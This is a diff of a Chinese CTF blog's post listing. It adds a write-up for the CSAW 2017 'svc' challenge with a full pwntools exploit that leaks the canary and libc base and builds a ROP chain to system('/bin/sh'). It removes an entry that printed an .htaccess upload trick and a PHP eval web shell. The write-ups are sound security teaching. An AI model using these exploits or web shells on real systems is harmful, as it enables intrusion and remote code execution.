@@ -131,6 +131,53 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/08/16/csawquals2017-svc-wp/" >nightmare 2.13.Csaw 2017 Quasl SVC-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-08-16
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://github.com/guyinatuxedo/nightmare/tree/master/modules/08-bof_dynamic/csawquals17_svc">相关资源</a>  </p>
+<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ checksec svc </span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0</span>x400000)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ ./svc</span><br><span class="line">-------------------------</span><br><span class="line">[*]SCV GOOD TO GO,SIR....</span><br><span class="line">-------------------------</span><br><span class="line">1.FEED SCV....</span><br><span class="line">2.REVIEW THE FOOD....</span><br><span class="line">3.MINE MINERALS....</span><br><span class="line">-------------------------</span><br><span class="line">&gt;&gt;1</span><br><span class="line">-------------------------</span><br><span class="line">[*]SCV IS ALWAYS HUNGRY.....</span><br><span class="line">-------------------------</span><br><span class="line">[*]GIVE HIM SOME FOOD.......</span><br><span class="line">-------------------------</span><br><span class="line">&gt;&gt;h-------------------------</span><br><span class="line">[*]SCV GOOD TO GO,SIR....</span><br><span class="line">-------------------------</span><br><span class="line">1.FEED SCV....</span><br><span class="line">2.REVIEW THE FOOD....</span><br><span class="line">3.MINE MINERALS....</span><br><span class="line">-------------------------</span><br><span class="line">&gt;&gt;2</span><br><span class="line">-------------------------</span><br><span class="line">[*]REVIEW THE FOOD...........</span><br><span class="line">-------------------------</span><br><span class="line">[*]PLEASE TREAT HIM WELL.....</span><br><span class="line">-------------------------</span><br><span class="line">h</span><br></pre></td></tr></table></figure>
+
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// [rsp+4h] [rbp-BCh] BYREF</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// [rsp+8h] [rbp-B8h]</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// [rsp+Ch] [rbp-B4h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">168</span>]; <span class="comment">// [rsp+10h] [rbp-B0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v27; <span class="comment">// [rsp+B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v27 = __readfsqword(<span class="number">0x28</span>u);	<span class="comment">// canary</span></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  v23 = <span class="number">0</span>;</span><br><span class="line">  v24 = <span class="number">1</span>;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v24 )</span><br><span class="line">  &#123;</span><br><span class="line">    [...]</span><br><span class="line">    <span class="built_in">std</span>::istream::operator&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v23);</span><br><span class="line">    <span class="keyword">switch</span> ( v23 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        [...]</span><br><span class="line">        <span class="built_in">puts</span>(buf);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v24 = <span class="number">0</span>;</span><br><span class="line">        [...]</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        [...]</span><br><span class="line">        v25 = read(<span class="number">0</span>, buf, <span class="number">248uLL</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        [...]</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>选项1读取输入，存在栈溢出</li>
+<li>选项2输出栈上内容</li>
+<li>选项3跳出循环，结束返回</li>
+<li>存在canary</li>
+</ol>
+<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><ol>
+<li>栈上填充至<code>canary</code>，然后输出，则可获取<code>canary</code>的值</li>
+<li>栈上填充至<code>ret address</code>，然后输出，则可获取<code>__libc_start_call_main</code>的地址进而计算libc基址</li>
+<li>计算<code>system</code>，<code>str_bin_sh</code>真实地址，构造pop链</li>
+</ol>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">pty = process.PTY</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">proc = process(<span class="string">&quot;./svc&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">x</span>): proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ga</span>(): <span class="keyword">return</span> u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">feed</span>(<span class="params">x</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>, x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b main</span></span><br><span class="line"><span class="string">    b * 0x400CCE</span></span><br><span class="line"><span class="string">    b * 0x400ddf</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">&#x27;-d&#x27;</span>:</span><br><span class="line">    gdb.attach(proc, gdbscript=gscript)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x4008b1</span></span><br><span class="line">rdi_ret = <span class="number">0x400ea3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get canary</span></span><br><span class="line">feed(<span class="string">b&#x27;h&#x27;</span>*(<span class="number">168</span> + <span class="number">1</span>))	<span class="comment"># 多1个是因为canary最后一个字节总是\x00，会截断输出，因此覆盖</span></span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;h&#x27;</span>*<span class="number">169</span>)</span><br><span class="line">canary = u64(ru(<span class="string">b&#x27;\n&#x27;</span>).strip(<span class="string">b&#x27;\x01\n&#x27;</span>).rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment"># get libc base</span></span><br><span class="line">feed(<span class="string">b&#x27;h&#x27;</span>*<span class="number">184</span>)</span><br><span class="line">show()</span><br><span class="line">start_main = ga() + <span class="number">0xc0</span> - <span class="number">0x8a</span>		<span class="comment"># gdb 中调试计算偏移量</span></span><br><span class="line">libc_base = start_main - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">str_binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># pop chain</span></span><br><span class="line">feed(<span class="string">b&#x27;h&#x27;</span>*<span class="number">168</span> + p64(canary) + <span class="string">b&#x27;h&#x27;</span>*<span class="number">8</span> + p64(ret) + p64(rdi_ret) + </span><br><span class="line">   p64(str_binsh) + p64(system))</span><br><span class="line">sla(<span class="string">b&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pi()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
+
+
+	
+	</div>
+  <a type="button" href="/2023/08/16/csawquals2017-svc-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/08/16/HCTF2016-兵者多诡-wp/" >HCTF2016-兵者多诡-wp</a>
 								</h3>
 							</div>
@@ -947,51 +994,6 @@
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/07/17/SWPUCTF2022-easyupload3-wp/" >SWPUCTF2022-easyupload3-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-07-17
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2025">题目链接</a></p>
-<ul>
-<li>apache服务器，标题提示“试试和某些文件配合呢”，尝试上传<code>.htacess</code> 文件，内容：</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1.jpg&quot;&gt; </span><br><span class="line">       SetHandler  application/x-httpd-php  </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
-
-<p>上传成功</p>
-<blockquote>
-<p>笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p>
-</blockquote>
-<p>相当于设定规则，把1.jpg当作php代码解析</p>
-<ul>
-<li><p>上传1.jpg</p>
-<p>内容为一句话木马：<code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code></p>
-</li>
-<li><p>访问 <code>/upload/1.jpg</code>   POST cmd&#x3D;phpinfo();  搜索flag即可看到</p>
-</li>
-</ul>
-
-	
-	</div>
-  <a type="button" href="/2023/07/17/SWPUCTF2022-easyupload3-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -1051,7 +1053,7 @@
 		
 			<li><a href="/categories/reverse-wp/">reverse-wp<span>6</span></a></li>
 		
-			<li><a href="/categories/web-learning/">web-learning<span>6</span></a></li>
+			<li><a href="/categories/web-learning/">web-learning<span>7</span></a></li>
 		
 			<li><a href="/categories/web-wp/">web-wp<span>51</span></a></li>
 		
@@ -1064,48 +1066,48 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/DASCTF2023/">DASCTF2023<span>1</span></a></li>
+			<li><a href="/tags/NSSCTF2022/">NSSCTF2022<span>1</span></a></li>
 		
-			<li><a href="/tags/IO-FILE/">IO_FILE<span>2</span></a></li>
+			<li><a href="/tags/赣网杯2021/">赣网杯2021<span>1</span></a></li>
 		
-			<li><a href="/tags/path-traversal/">path_traversal<span>1</span></a></li>
+			<li><a href="/tags/Hacklu2015/">Hacklu2015<span>1</span></a></li>
 		
-			<li><a href="/tags/got/">got<span>3</span></a></li>
-		
-			<li><a href="/tags/伪协议/">伪协议<span>3</span></a></li>
-		
-			<li><a href="/tags/Spring/">Spring<span>1</span></a></li>
-		
-			<li><a href="/tags/De1ctf2019/">De1ctf2019<span>1</span></a></li>
-		
-			<li><a href="/tags/php原生类/">php原生类<span>1</span></a></li>
-		
-			<li><a href="/tags/privilege-escalation/">privilege escalation<span>1</span></a></li>
-		
-			<li><a href="/tags/SROP/">SROP<span>2</span></a></li>
-		
-			<li><a href="/tags/CTF/">CTF<span>90</span></a></li>
-		
-			<li><a href="/tags/GKCTF2021/">GKCTF2021<span>1</span></a></li>
-		
-			<li><a href="/tags/SwampCTF2019/">SwampCTF2019<span>1</span></a></li>
-		
-			<li><a href="/tags/file-include/">file_include<span>5</span></a></li>
-		
-			<li><a href="/tags/upload/">upload<span>4</span></a></li>
-		
-			<li><a href="/tags/jwt/">jwt<span>1</span></a></li>
-		
-			<li><a href="/tags/dcquals2016/">dcquals2016<span>1</span></a></li>
-		
-			<li><a href="/tags/libc/">libc<span>1</span></a></li>
+			<li><a href="/tags/CTFSHOW/">CTFSHOW<span>2</span></a></li>
 		
 			<li><a href="/tags/NISACTF2022/">NISACTF2022<span>8</span></a></li>
 		
-			<li><a href="/tags/网鼎杯2018/">网鼎杯2018<span>1</span></a></li>
+			<li><a href="/tags/file-include/">file_include<span>5</span></a></li>
+		
+			<li><a href="/tags/javascript/">javascript<span>1</span></a></li>
+		
+			<li><a href="/tags/fmt-str/">fmt_str<span>2</span></a></li>
+		
+			<li><a href="/tags/Backdoorctf/">Backdoorctf<span>1</span></a></li>
+		
+			<li><a href="/tags/malloc-hook/">__malloc_hook<span>1</span></a></li>
+		
+			<li><a href="/tags/bypass/">bypass<span>5</span></a></li>
+		
+			<li><a href="/tags/rce/">rce<span>17</span></a></li>
+		
+			<li><a href="/tags/UUCTF2022/">UUCTF2022<span>2</span></a></li>
+		
+			<li><a href="/tags/LitCTF2023/">LitCTF2023<span>2</span></a></li>
+		
+			<li><a href="/tags/HDCTF2023/">HDCTF2023<span>5</span></a></li>
+		
+			<li><a href="/tags/HCTF2016/">HCTF2016<span>1</span></a></li>
+		
+			<li><a href="/tags/QEMU/">QEMU<span>1</span></a></li>
+		
+			<li><a href="/tags/sha1/">sha1<span>1</span></a></li>
+		
+			<li><a href="/tags/sql/">sql<span>8</span></a></li>
+		
+			<li><a href="/tags/HUBUCTF2022/">HUBUCTF2022<span>1</span></a></li>
 		
 		
-		   <li><a href="/tags">...<span>118</span></a></li>
+		   <li><a href="/tags">...<span>120</span></a></li>
 		 
 		</ul>
 	</div>
@@ -1116,6 +1118,10 @@
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2023/12/25/ejs原型链污染RCE/" ><i class="fa fa-file-o"></i>ejs原型链污染RCE</a>
+      </li>
     
       <li>
         <a href="/2023/12/20/HGAME2023-Designer-wp/" ><i class="fa fa-file-o"></i>HGAME2023-Designer-wp</a>
@@ -1131,10 +1137,6 @@
     
       <li>
         <a href="/2023/12/10/HNCTF2023-BabyJxVx-wp/" ><i class="fa fa-file-o"></i>HNCTF2023-BabyJxVx-wp</a>
-      </li>
-    
-      <li>
-        <a href="/2023/11/24/xxe/" ><i class="fa fa-file-o"></i>xxe</a>
       </li>
     
   </ul>
